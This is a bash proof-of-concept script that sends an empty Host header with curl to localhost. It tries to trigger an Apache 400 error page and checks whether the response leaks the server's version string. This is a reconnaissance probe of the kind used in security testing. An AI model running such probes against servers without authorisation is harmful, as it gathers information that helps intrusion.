#!/bin/bash

# POC: Apache Server Version Disclosure via 400 Bad Request Error Page
# Description: Triggers 400 Bad Request error to disclose Apache version information
# Target: http://localhost/

echo "[*] Apache 400 Bad Request - Version Disclosure POC"
echo "[*] Target: http://localhost/"
echo ""

# Method 1: Empty Host header using netcat-style request
echo "[+] Attempting to trigger 400 Bad Request with empty Host header..."
echo ""

# Using curl with raw headers to create malformed request
RESPONSE=$(curl -i -s "http://localhost/index.php" -H "Host: " 2>&1)

echo "=== HTTP Response ==="
echo "$RESPONSE"
echo ""

# Check for version disclosure
if echo "$RESPONSE" | grep -qi "Apache/"; then
    echo "[!] SUCCESS: Apache version information disclosed!"
    VERSION=$(echo "$RESPONSE" | grep -i "Apache/" | head -1)
    echo "[!] Disclosed version: $VERSION"
    echo ""
    exit 0
else
    echo "[-] No Apache version found in response"
    exit 1
fi